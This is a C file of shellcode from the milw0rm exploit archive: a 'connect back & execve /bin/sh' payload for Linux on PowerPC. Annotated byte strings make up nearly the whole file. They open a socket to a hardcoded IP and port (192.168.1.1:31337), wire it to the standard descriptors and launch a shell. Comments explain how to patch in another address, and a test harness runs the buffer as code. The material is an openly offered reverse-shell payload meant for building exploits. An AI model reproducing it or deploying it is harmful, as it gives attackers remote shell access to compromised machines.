/* connect-core5.c by Charles Stevenson <core@bokeoa.com> */
char hellcode[] = /* connect back & execve /bin/sh linux/ppc by core */
"\x7c\x3f\x0b\x78"	/*mr	r31,r1*/
"\x3b\x40\x01\x0e"	/*li	r26,270*/
"\x3b\x5a\xfe\xf4"	/*addi	r26,r26,-268*/
"\x7f\x43\xd3\x78"	/*mr	r3,r26*/
"\x3b\x60\x01\x0d"	/*li	r27,269*/
"\x3b\x7b\xfe\xf4"	/*addi	r27,r27,-268*/
"\x7f\x64\xdb\x78"	/*mr	r4,r27*/
"\x7c\xa5\x2a\x78"	/*xor	r5,r5,r5*/
"\x7c\x3c\x0b\x78"	/*mr	r28,r1*/
"\x3b\x9c\x01\x0c"	/*addi	r28,r28,268*/
"\x90\x7c\xff\x08"	/*stw	r3,-248(r28)*/
"\x90\x9c\xff\x0c"	/*stw	r4,-244(r28)*/
"\x90\xbc\xff\x10"	/*stw	r5,-240(r28)*/
"\x7f\x63\xdb\x78"	/*mr	r3,r27*/
"\x3b\xdf\x01\x0c"	/*addi	r30,r31,268*/
"\x38\x9e\xff\x08"	/*addi	r4,r30,-248*/
"\x3b\x20\x01\x98"	/*li	r25,408*/
"\x7f\x20\x16\x70"	/*srawi	r0,r25,2*/
"\x44\xde\xad\xf2"	/*.long 0x44deadf2*/
"\x7c\x78\x1b\x78"	/*mr	r24,r3*/
"\xb3\x5e\xff\x16"	/*sth	r26,-234(r30)*/
"\x7f\xbd\xea\x78"	/*xor	r29,r29,r29*/
// Craft your exploit to poke these value in. Right now it's set
// for port 31337 and ip 192.168.1.1. Here's an example
// core@morpheus:~$ printf "0x%02x%02x\n0x%02x%02x\n" 192 168 1 1
// 0xc0a8
// 0x0101
"\x63\xbd" /* PORT # */ "\x7a\x69"	/*ori	r29,r29,31337*/
"\xb3\xbe\xff\x18"	/*sth	r29,-232(r30)*/
"\x3f\xa0" /*IP(A.B) */ "\xc0\xa8"	/*lis	r29,-16216*/
"\x63\xbd" /*IP(C.D) */ "\x01\x01"	/*ori	r29,r29,257*/
"\x93\xbe\xff\x1a"	/*stw	r29,-230(r30)*/
"\x93\x1c\xff\x08"	/*stw	r24,-248(r28)*/
"\x3a\xde\xff\x16"	/*addi	r22,r30,-234*/
"\x92\xdc\xff\x0c"	/*stw	r22,-244(r28)*/
"\x3b\xa0\x01\x1c"	/*li	r29,284*/
"\x38\xbd\xfe\xf4"	/*addi	r5,r29,-268*/
"\x90\xbc\xff\x10"	/*stw	r5,-240(r28)*/
"\x7f\x20\x16\x70"	/*srawi	r0,r25,2*/
"\x7c\x7a\xda\x14"	/*add	r3,r26,r27*/
"\x38\x9c\xff\x08"	/*addi	r4,r28,-248*/
"\x44\xde\xad\xf2"	/*.long0x44deadf2*/
"\x7f\x03\xc3\x78"	/*mr	r3,r24*/
"\x7c\x84\x22\x78"	/*xor	r4,r4,r4*/
"\x3a\xe0\x01\xf8"	/*li	r23,504*/
"\x7e\xe0\x1e\x70"	/*srawi	r0,r23,3*/
"\x44\xde\xad\xf2"	/*.long 0x44deadf2*/
"\x7f\x03\xc3\x78"	/*mr	r3,r24*/
"\x7f\x64\xdb\x78"	/*mr	r4,r27*/
"\x7e\xe0\x1e\x70"	/*srawi	r0,r23,3*/
"\x44\xde\xad\xf2"	/*.long 0x44deadf2*/
// comment out the next 4 lines to save 16 bytes and lose stderr
//"\x7f\x03\xc3\x78"	/*mr	r3,r24*/
//"\x7f\x44\xd3\x78"	/*mr	r4,r26*/
//"\x7e\xe0\x1e\x70"	/*srawi	r0,r23,3*/
//"\x44\xde\xad\xf2"	/*.long 0x44deadf2*/
"\x7c\xa5\x2a\x79"	/*xor.	r5,r5,r5*/
"\x42\x40\xff\x35"	/*bdzl+	10000454<main>*/
"\x7f\x08\x02\xa6"	/*mflr	r24*/
"\x3b\x18\x01\x34"	/*addi	r24,r24,308*/
"\x98\xb8\xfe\xfb"	/*stb	r5,-261(r24)*/
"\x38\x78\xfe\xf4"	/*addi	r3,r24,-268*/
"\x90\x61\xff\xf8"	/*stw	r3,-8(r1)*/
"\x38\x81\xff\xf8"	/*addi	r4,r1,-8*/
"\x90\xa1\xff\xfc"	/*stw	r5,-4(r1)*/
"\x3b\xc0\x01\x60"	/*li	r30,352*/
"\x7f\xc0\x2e\x70"	/*srawi	r0,r30,5*/
"\x44\xde\xad\xf2"	/*.long 0x44deadf2*/
"/bin/shZ";	/* Z will become NULL */

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte connect back execve /bin/sh for linux/ppc by core\n",
          strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]